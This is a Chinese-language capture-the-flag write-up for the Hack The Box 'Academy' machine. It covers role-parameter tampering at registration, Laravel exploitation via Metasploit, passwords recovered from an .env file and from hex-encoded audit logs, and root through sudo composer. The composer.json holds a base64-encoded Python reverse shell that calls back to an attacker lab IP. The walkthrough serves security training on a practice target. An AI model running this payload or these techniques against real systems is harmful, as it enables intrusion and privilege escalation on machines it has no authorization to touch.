categories:
- 靶场
tags:
- htb
- wp
title:   Academy_write_up
---
# Academy Write Up

目标：10.10.10.215

## 端口扫描

```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  socks5?

```

33060端口不知道是啥

## 攻击http服务

扫描目录得到

```
[20:35:08] 200 -    3KB - /admin.php
[20:36:10] 200 -    0B  - /config.php
[20:37:09] 302 -   54KB - /home.php  ->  login.php
[20:37:21] 200 -    2KB - /index.php
[20:37:40] 200 -    3KB - /login.php
[20:38:32] 200 -    3KB - /register.php
```

测试登入，注册接口的时候发现，

注册的POST请求是这样的：`uid=admin123&password=admin123&confirm=admin123&roleid=0`

有个roleid参数，将其改成1，注册admin账号

admin登入成功后，发现子域名

![image811](https://raw.githubusercontent.com/Explorersss/photo/master/20201112224004.png)









一进去网站就是报错状态，试着爆破路径，啥也没有

![image951](https://raw.githubusercontent.com/Explorersss/photo/master/20201111213605.png)



msf搜索了一下laravel

![image1077](https://raw.githubusercontent.com/Explorersss/photo/master/20201112224208.png)



设置好参数试了一下就打通了



## 提权

### www-data用户提升至cry0l1t3

翻了翻配置文件找到/var/www/html/academy/.env

```

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

```

这个密码诶个是过去发现是cry0l1t3的密码

### cry0l1t3移动到mrb3n





```
id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

发现和syslog在同一个组下，我们可以查看任意日志了

`cd /var/log/audit&&cat * | grep data=` 查看用户的输入

```
type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
type=TTY msg=audit(1597199304.778:89): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=77686F616D690A
type=TTY msg=audit(1597199308.262:90): tty pid=2526 uid=1001 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
type=TTY msg=audit(1597199317.622:93): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199443.421:94): tty pid=2606 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199533.458:95): tty pid=2643 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=1B5B421B5B411B5B411B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B427F1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D
type=TTY msg=audit(1597199575.087:96): tty pid=2686 uid=1002 auid=0 ses=1 major=4 minor=1 comm="nano" data=3618790D
type=TTY msg=audit(1597199606.563:97): tty pid=2537 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=63611B5B411B5B411B5B417F7F636174206175097C206772657020646174613D0D636174206175097C20637574202D663131202D642220220D1B5B411B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B441B5B431B5B436772657020646174613D207C200D1B5B41203E202F746D702F646174612E7478740D69640D6364202F746D700D6C730D6E616E6F2064090D636174206409207C207878092D72202D700D6D617F7F7F6E616E6F2064090D6361742064617409207C20787864202D7220700D1B5B411B5B442D0D636174202F7661722F6C6F672F61750974097F7F7F7F7F7F6409617564097C206772657020646174613D0D1B5B411B5B411B5B411B5B411B5B411B5B420D1B5B411B5B411B5B410D1B5B411B5B411B5B410D657869747F7F7F7F686973746F72790D657869740D
type=TTY msg=audit(1597199606.567:98): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A
type=TTY msg=audit(1597199610.163:107): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=2F62696E2F62617368202D690A
type=TTY msg=audit(1597199616.307:108): tty pid=2712 uid=1002 auid=0 ses=1 major=4 minor=1 comm="bash" data=6973746F72790D686973746F72790D657869740D
type=TTY msg=audit(1597199616.307:109): tty pid=2709 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=657869740A

```



其中的`7375206D7262336E0A`=`su mrb3n`,`6D7262336E5F41634064336D79210A`=`mrb3n_Ac@d3my!`

拿到mrb3n的密码

### mrb3n提权root

sudo -l 看看自己能不能用sudo

![image4850](https://raw.githubusercontent.com/Explorersss/photo/master/20201112225248.png)

发现我们可以用sudo 执行composer

直接RCE

新建composer.json

```
{
    "scripts": {
        "test": "python3 -c \"import base64; exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjEwLjE0Ljk5Jyw1NTU1KSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRvdXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk='))\""
    }
}
```

`sudo composer run-script --timeout=0 test`

拿到root权限

![image5511](https://raw.githubusercontent.com/Explorersss/photo/master/20201112225515.png)



## 总结

1. 一定要记得看自己能不能sudo
2. 在adm组中通常可以查看任意日志
3. /var/log/audit存放着用户的输入，很有可能拿到密码



